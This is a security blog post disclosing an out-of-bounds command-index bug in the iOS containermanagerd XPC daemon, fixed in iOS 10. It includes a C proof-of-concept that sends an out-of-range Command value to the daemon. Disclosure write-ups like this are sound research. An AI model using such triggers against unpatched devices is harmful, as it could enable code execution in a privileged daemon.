---
layout: post
title:  "[CVE-2016-????] iOS containermanagerd XPC array out of bound vulnerability"
date:   2016-06-17 12:00:00 +0800
categories: security apple xpc
---

Today I remembered about a iOS bug I had in `containermanagerd`, and I tought to check if it still was present in `iOS 10 beta`.

## Preliminary informations

`containermanagerd` is a privileged daemon on iOS that manages application containers and stuff.

`XPC` is a OS X/iOS IPC higher level mechanism compared to mach messages or MIG...

You may want to also check some research on `XPC`, such as [`Pangu` presentations][pangu-xpc], and `Ian Beer` Project Zero bugs, PoCs and presentation.

## Brief Explanation

If you want to follow along, you can also do it thanks to the "Apple leak" on `iOS 10`, where they forgot to encrypt a bunch of stuff in the `ipsw` of several models, including the `root filesystem` (so you can get the `containermanagerd` binary and drop it in `IDA Pro`) and `kernelcache`.

As you can imagine since I'm writing this post, the bug has been fixed in `iOS 10`.

The post will be fairly short, just dropping the trigger `PoC`.

The bug is fairly simple, we control a index used with an "array of commands", in which a command is a string and a function pointer (huh?), so we can make the program grab a "command" from a wrong location, possibly executing arbitrary code.

If you want to see more details about the bug, just drop a unpatched version of `containermanagerd` in IDA.

## Vulnerable Code

![containermanagerd patched](/assets/containermanagerd.jpg)

The red box is the new added check in iOS 10 on the array index, which comes from the input with `xpc_dictionary_get_uint64` with "Command" key (wrongly shown in IDA decompilation).

Later after this index is used to access the array I mentioned.

This is how the code looks like in iOS 9.2 `containermanagerd`

![containermanagerd vuln](/assets/containermanagerd_vuln.jpg)

## PoC:

{% highlight c %}
#include "xpc/xpc.h"
#include <CoreFoundation/CoreFoundation.h>

int main(int argc, char **argv, char **envp) {
    xpc_connection_t client = xpc_connection_create_mach_service("com.apple.containermanagerd",
                                                                   NULL,
                                                                     0);
    xpc_connection_set_event_handler(client, ^(xpc_object_t event) {
        //connection err handler
    });
    xpc_connection_resume(client);
    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);



    xpc_dictionary_set_uint64(message, "Command", 0x41414141);
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(client, message);

    NSLog(@"reply %@", reply);

    return 0;
}
{% endhighlight %}

#### Take aways:
- All input that comes via IPC should be treated as untrusted.

[pangu-xpc]: https://www.blackhat.com/docs/us-15/materials/us-15-Wang-Review-And-Exploit-Neglected-Attack-Surface-In-iOS-8.pdf
